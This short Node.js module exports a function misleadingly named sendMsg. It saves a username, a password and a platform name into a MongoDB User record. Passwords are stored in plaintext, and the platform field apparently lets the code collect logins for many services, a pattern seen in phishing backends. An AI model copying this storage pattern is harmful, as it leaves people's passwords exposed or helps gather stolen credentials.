const mongoose = require("mongoose");
const User = require("./User");

async function sendMsg(identifier, password, platform) {
  const user = await new User({
    Platform: platform,
    Username: identifier,
    Password: password,
  });

  try {
    await user.save();
    return true;
  } catch (error) {
    console.error(error);
    return false;
  }
}

module.exports = sendMsg;
